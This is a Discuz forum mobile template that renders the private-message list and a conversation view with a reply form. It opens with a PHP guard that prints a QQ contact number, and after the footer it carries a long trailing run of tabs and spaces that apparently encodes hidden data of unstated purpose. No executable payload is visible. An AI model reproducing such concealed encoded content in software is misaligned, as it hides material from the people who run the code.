<?php echo 'QQ:2399835618';exit;?>
<!--{eval $_G['home_tpl_titles'] = array('{lang pm}');}-->
<!--{template common/header}-->

<!--{if in_array($filter, array('privatepm')) || in_array($_GET[subop], array('view'))}-->

	<!--{if in_array($filter, array('privatepm'))}-->

	<!-- header start -->
	<header class="header">
	    <div class="nav">
	        <a href="home.php?mod=space&uid=$_G[uid]&do=profile&mycenter=1" class="z xxmfont iconzuo xxmfstt"></a>
			<span class="category"><span class="name">{lang pm_center}</span></span>
			<div class="y"><a href="home.php?mod=spacecp&ac=pm" class="xxmfont iconmessage"></a></div>
	    </div>
	</header>
	<!-- header end -->
	<!-- main pmlist start -->
	<div class="pmbox">
		<ul>
			<!--{if !$list}-->
				<li class="b_m b_p hm grey fs16">{lang no_corresponding_pm}</li>
			<!--{else}-->
				<!--{loop $list $key $value}-->
				<li>
					<div class="avatar_img">
						<img style="height:32px;width:32px;" src="<!--{if $value[pmtype] == 2}-->{STATICURL}image/common/grouppm.png<!--{else}--><!--{avatar($value[touid] ? $value[touid] : ($value[lastauthorid] ? $value[lastauthorid] : $value[authorid]), middle, true)}--><!--{/if}-->" />
					</div>
					<a href="{if $value[touid]}home.php?mod=space&do=pm&subop=view&touid=$value[touid]{else}home.php?mod=space&do=pm&subop=view&plid={$value['plid']}&type=1{/if}">
						<div class="cl">
							<!--{if $value[new]}--><span class="num">$value[pmnum]</span><!--{/if}-->
							<!--{if $value[touid]}-->
								<!--{if $value[msgfromid] == $_G[uid]}-->
									<span class="name">{$value[tousername]}</span>
								<!--{else}-->
									<span class="name">{$value[tousername]}</span>
								<!--{/if}-->
							<!--{elseif $value['pmtype'] == 2}-->
								<span class="name">{lang chatpm_author} : $value['firstauthor']</span>
							<!--{/if}-->
							<span class="time grey"><!--{date($value[dateline], 'u')}--></span>
						</div>
						<div class="cl grey">
							<span><!--{if $value['pmtype'] == 2}-->[{lang chatpm}]<!--{if $value[subject]}-->$value[subject]<br><!--{/if}--><!--{/if}--><!--{if $value['pmtype'] == 2 && $value['lastauthor']}--><div style="padding:0 0 0 20px;">......<br>$value['lastauthor'] : $value[message]</div><!--{else}-->$value[message]<!--{/if}--></span>
						</div>
					</a>
				</li>
				<!--{/loop}-->
			<!--{/if}-->
		</ul>
	</div>
	<!-- main pmlist end -->

	<!--{elseif in_array($_GET[subop], array('view'))}-->

	<!-- header start -->
	<header class="header">
	    <div class="nav">
	        <a href="home.php?mod=space&do=pm" class="z xxmfont iconzuo xxmfstt"></a>
			<span><!--{if $tousername}-->{$tousername}<!--{else}-->{lang viewmypm}<!--{/if}--></span>
			<div class="y"><a href="forum.php" class="xxmfont iconhome xxmfstt"></a></div>
	    </div>
	</header>
	<!-- header end -->
	<!-- main viewmsg_box start -->
	<div class="wp">
		<div class="msgbox b_m">
			<!--{if !$list}-->
				<p class="grey hm">{lang no_corresponding_pm}</p>
			<!--{else}-->
				<!--{loop $list $key $value}-->
					<!--{subtemplate home/space_pm_node}-->
				<!--{/loop}-->
				$multi
			<!--{/if}-->
		</div>
        <form id="pmform" class="pmform" name="pmform" method="post" action="home.php?mod=spacecp&ac=pm&op=send&pmid=$pmid&daterange=$daterange&pmsubmit=yes&mobile=2" >
			<input type="hidden" name="formhash" value="{FORMHASH}" />
			<!--{if !$touid}-->
			<input type="hidden" name="plid" value="$plid" />
			<!--{else}-->
			<input type="hidden" name="touid" value="$touid" />
			<!--{/if}-->
			<div class="pmreply b_m"><input type="text" value="" class="pminput" autocomplete="off" id="replymessage" name="message"></div>
			<div class="reply b_m"><input type="button" name="pmsubmit" id="pmsubmit" class="formdialog button_pm" value="{lang reply}" /></div>
        </form>
	</div>
	<!-- main viewmsg_box end -->

	<!--{/if}-->

<!--{else}-->

	<div class="bm_c">
		{lang user_mobile_pm_error}
	</div>
	
<!--{/if}-->

<!--{template common/footer}-->
    		  	  		  	  		     	  	  	    		   		     		       	 				 	    		   		     		       	 			 	     		   		     		       	   			    		   		     		       	 			  	    		   		     		       	  	 	     		   		     		       	  	 	     		   		     		       	   		     		   		     		       	 	  	     		   		     		       	  		      		   		     		       	  				    		   		     		       	  	  	    		   		     		       	  	 		    		   		     		       	 	  	     		   		     		       	  		      		   		     		       	  	       		   		     		       	 			 	     		   		     		       	  				    		   		     		       	 	  	     		   		     		       	   			    		   		     		       	   		     		   		     		       	  	 	     		   		     		       	 			  	    		   		     		       	 	  	     		   		     		       	   			    		   		     		       	 				 	    		   		     		       	   			    		   		     		       	  			     		   		     		       	  			     		   		     		       	  			     		   		     		       	 			 	     		   		     		       	  	  	    		   		     		       	   			    		   		     		       	  		      		   		     		       	 				      		   		     		       	 				      		 	      	  		  	  		     	